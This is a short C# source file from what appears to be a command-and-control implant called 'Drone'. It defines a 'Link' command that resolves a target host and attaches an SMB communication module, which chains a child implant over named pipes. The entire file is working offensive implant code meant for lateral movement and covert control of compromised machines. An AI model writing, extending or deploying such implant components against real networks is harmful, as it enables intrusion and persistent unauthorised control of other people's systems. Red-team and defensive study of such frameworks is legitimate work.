using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Drone.CommModules;

namespace Drone.Commands;

public sealed class Link : DroneCommand
{
    public override byte Command => 0x5B;
    public override bool Threaded => false;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        // this needs to be a hostname
        var address = task.Arguments[0];

        if (IPAddress.TryParse(address, out var ip))
        {
            var entry = await Dns.GetHostEntryAsync(ip);
            address = entry.HostName;
        }
        
        var commModule = new SmbCommModule(address, task.Arguments[1]);
        await Drone.AddChildCommModule(task.Id, commModule);
    }
}